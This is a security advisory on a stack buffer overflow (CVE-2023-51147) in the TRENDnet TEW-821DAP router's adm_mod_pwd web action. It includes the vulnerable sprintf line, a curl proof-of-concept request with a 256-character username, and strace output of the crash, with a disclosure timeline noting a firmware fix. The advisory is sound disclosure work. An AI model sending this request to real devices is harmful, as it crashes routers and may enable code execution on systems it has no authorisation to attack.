# Buffer overflow in adm\_mod\_pwd (CVE-2023-51147) #

## Summary
We identified a buffer overflow vulnerability on TRENDnet AC1200 TEW-821DAP device (v2.0R and v2.5R, firmware version 3.00b06). The `adm_mod_pwd` function of the device's web interface can be exploited by an authenticated attacker to trigger a Denial of Service (DoS) condition or possibly execute arbitrary code.

## Product
* TRENDnet AC1200 TEW-821DAP V2.0R (firmware 3.00b06)
* TRENDnet AC1200 TEW-821DAP V2.5R (firmware 3.00b06)

## Details
The `ssi` service is vulnerable to a security issue related with the `adm_mod_pwd` action. Specifically, parameter `username` within this action can be exploited to manipulate the return address of the corresponding request-handling function.

The root cause of this vulnerability is the missing length check of the `username` parameter before being used in the following `sprintf()` call:

```
sprintf(buffer, "grep \"^%s:\" /etc/passwd", username);
```

In the statement above, `buffer` is a 64-byte array, and `username` is a value passed via HTTP requests, with a maximum size of 256 characters. The buffer variable is located at -0x44 (-68) bytes from the stack pointer.

By sending an HTTP request with a `username` parameter containing 256 characters, an attacker can trigger a stack-based buffer overflow, leading to stack corruption.

## PoC

```
curl -i -s -k -X $'POST' \
	-H $'Host: <Target IP>' -H $'Content-Type: application/json' -H $'Authorization: Bearer 50b7332d-b6eb-44b7-99b0-6d06d52913d6' -H $'Content-Length: 314' -H $'Connection: close' \
	--data-binary $'{\"username\":\"<a x 256>\",\"password\":\"pluto\",\"action\":\"adm_mod_pwd\"}' \
	$'http://<Target IP>/apply.cgi'
```

When the request above is processed by the device web UI a stack-based buffer overflow occurs, as shown in the `strace` output below (here we traced `uhttpd`, that eventually executes the vulnerable `ssi` CGI).

```
[pid  2361] [77376c74] execve("/www/cgi/ssi", ["/www/cgi/ssi", "/www/apply.cgi"], [...]) = 0
[pid  2291] [773bcedc] write(13, "{\"username\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"password\":\"pluto\",\"action\":\"adm_mod_pwd\"}", 314) = 314
strace: Process 2362 attached
[...]
[pid  2363] [777cec74] execve("/bin/grep", ["grep", "^aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:", "/etc/passwd"], [...]) = 0
[...]
[pid  2361] [77db3edc] write(2, "stack smashing detected: ", 25) = 25
[pid  2361] [77db3edc] write(2, "/www/cgi/ssi", 12) = 12
[pid  2361] [77db3edc] write(2, " terminated", 11) = 11
[pid  2361] [77db3edc] write(2, "()\n", 3) = 3
[pid  2361] [77d71664] --- SIGIOT {si_signo=SIGIOT, si_code=SI_USER, si_pid=2361, si_uid=0} ---
[pid  2361] [????????] +++ killed by SIGIOT +++
[pid  2291] [773bcedc] write(9, "HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\nContent-Type: text/plain\r\nTransfer-Encoding: chunked\r\n\r\n", 101) = 101
```
## Impact
By exploiting this vulnerability it could be possible to alter the normal behavior of the web server that hosts the management GUI of the router and possibly achieve arbitrary code execution.

## Additional information

### Credit
Spike Reply Cybersecurity Team

### Disclosure Timeline

- December 6, 2023: Initial vendor contact
- December 11, 2023: Vulnerability confirmed by TRENDnet
- January 2, 2024: TRENDnet shares a preview version of the firmware that includes the security fixes 3.02B04
- January 8, 2024: Spike confirms that security fixes included in firmware 3.02B04 are effective
- January 9, 2024: TRENDnet confirms that customers will be notified about the new firmware version
- March 8, 2024: Disclosure
